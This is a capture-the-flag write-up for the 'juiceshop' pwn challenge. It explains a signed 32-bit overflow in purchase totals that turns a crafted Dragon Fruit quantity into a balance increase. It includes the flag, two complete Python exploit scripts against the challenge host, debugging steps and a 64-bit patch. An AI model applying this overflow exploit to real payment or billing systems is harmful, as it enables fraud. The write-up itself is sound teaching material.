# juiceshop (491) - PWN Writeup

Target:
- `challs.insec.club:40002`
- Challenge: `juiceshop`

Flag:
- `INSEC{h0w_mUch_4_d0LlAr_reAl1y_c0ST??}`

## TL;DR
The shop uses vulnerable signed 32-bit arithmetic for purchase totals. By buying Dragon Fruit Juice with a crafted large quantity, the total price becomes negative after overflow, which increases balance instead of decreasing it.

Then:
1. Overflow to reach `1000001`
2. Buy one Orange Juice to reach exactly `1000000`
3. Buy Flag Juice (it requires exactly `1000000`)

## Recon
Initial service menu:

- Balance starts at `1000$`
- Prices:
  - Watermelon: `4$`
  - Apple: `10$`
  - Dragon Fruit: `5$`
  - Orange: `1$`
  - Flag Juice: `1000000$`

Important behavior observed:
- Negative quantities are not directly accepted in normal paths.
- Very large quantities can produce overflow behavior.
- Flag path enforces exact money check:
  - `I only accept EXACTLY 1000000$. I don't have change.`

## Vulnerability Analysis
The Dragon Fruit buy path behaves like this (effective logic):

```c
int total = qty * 5;        // signed 32-bit overflow
if (total > balance) {
    puts("Not enough money.");
} else {
    balance -= total;       // if total is negative, balance increases
}
```

### Crafted Overflow
Choose:
- Item: Dragon Fruit (`price = 5`)
- Quantity: `858793659`

Math:
- `5 * 858793659 = 4293968295`
- `2^32 = 4294967296`
- As signed int32:
  - `4293968295 - 4294967296 = -999001`

Balance update:
- Start: `1000`
- `balance = 1000 - (-999001) = 1000001`

Now spend `1` using Orange Juice:
- `1000001 - 1 = 1000000`

Buy flag with exact amount.

## Exploit Steps
1. Connect to service.
2. Buy Dragon Fruit (`3`) with qty `858793659` -> balance `1000001`.
3. Buy Orange (`4`) with qty `1` -> balance `1000000`.
4. Buy Flag Juice (`5`) and read flag.

## Final Exploit (pwntools)
```python
#!/usr/bin/env python3
from pwn import *
import re

HOST = "challs.insec.club"
PORT = 40002

QTY_OVERFLOW = 858793659
ANSI_RE = re.compile(rb"\x1b\[[0-9;]*[A-Za-z]")


def clean(data: bytes) -> bytes:
    return ANSI_RE.sub(b"", data)


def parse_balance(data: bytes):
    matches = re.findall(rb"Balance:\s*(\d+)\$", data)
    return int(matches[-1]) if matches else None


def recv_menu(io):
    return clean(io.recvuntil(b"> "))


def recv_qty_prompt(io):
    return clean(io.recvuntil(b"Quantity:"))


def buy(io, choice: int, qty: int):
    io.sendline(str(choice).encode())
    recv_qty_prompt(io)
    io.sendline(str(qty).encode())
    out = recv_menu(io)
    return out, parse_balance(out)


def main():
    context.log_level = "info"
    io = remote(HOST, PORT)

    banner = recv_menu(io)
    bal = parse_balance(banner)
    log.info(f"Initial balance: {bal}")

    out, bal = buy(io, 3, QTY_OVERFLOW)
    log.info(f"After overflow buy: {bal}")
    if bal != 1_000_001:
        log.failure("Unexpected balance after overflow step")
        print(out.decode("latin1", "replace"))
        io.close()
        return

    out, bal = buy(io, 4, 1)
    log.info(f"After spending 1$: {bal}")
    if bal != 1_000_000:
        log.failure("Did not reach exact 1,000,000")
        print(out.decode("latin1", "replace"))
        io.close()
        return

    io.sendline(b"5")
    data = clean(io.recvrepeat(2.0))

    # Some deployments may ask quantity here as well.
    if b"Quantity:" in data:
        io.sendline(b"1")
        data += clean(io.recvrepeat(2.0))

    print(data.decode("latin1", "replace"))
    io.close()


if __name__ == "__main__":
    main()
```

## Raw Socket Version (no pwntools)
```python
#!/usr/bin/env python3
import socket
import re

HOST = "challs.insec.club"
PORT = 40002
ANSI_RE = re.compile(rb"\x1b\[[0-9;]*[A-Za-z]")


def clean(b):
    return ANSI_RE.sub(b"", b)


def recv_until(sock, token=b"> ", timeout=3.0):
    sock.settimeout(timeout)
    out = b""
    while token not in out:
        chunk = sock.recv(4096)
        if not chunk:
            break
        out += chunk
    return out


with socket.create_connection((HOST, PORT), timeout=5) as s:
    print(clean(recv_until(s)).decode("latin1", "replace"))

    s.sendall(b"3\n")
    recv_until(s, b"Quantity:")
    s.sendall(b"858793659\n")
    print(clean(recv_until(s)).decode("latin1", "replace"))

    s.sendall(b"4\n")
    recv_until(s, b"Quantity:")
    s.sendall(b"1\n")
    print(clean(recv_until(s)).decode("latin1", "replace"))

    s.sendall(b"5\n")
    out = clean(s.recv(4096))
    if b"Quantity:" in out:
        s.sendall(b"1\n")
        out += clean(s.recv(4096))

    print(out.decode("latin1", "replace"))
```

## Reproduce Locally (if binary is provided)
```bash
checksec --file ./juiceshop
file ./juiceshop
strings -a ./juiceshop | egrep "EXACTLY|Dragon|Flag|Quantity|Balance"
objdump -dM intel ./juiceshop | less
```

Example gdb flow:
```bash
gdb -q ./juiceshop
```
```gdb
set disassembly-flavor intel
set pagination off
b main
run
```

Then break at the function handling menu option `3` and inspect:
- quantity parsing
- multiplication result type (`int` vs wider)
- comparison and subtraction path

## Patch Recommendation
To fix:
- Validate quantity bounds (`qty > 0` and max safe quantity)
- Use 64-bit math for cost and explicit overflow checks
- Reject if `cost < 0` or `cost > balance`

Safe pattern:
```c
long long cost = (long long)qty * price;
if (qty <= 0 || cost < 0 || cost > balance) {
    deny();
} else {
    balance -= (int)cost;
}
```
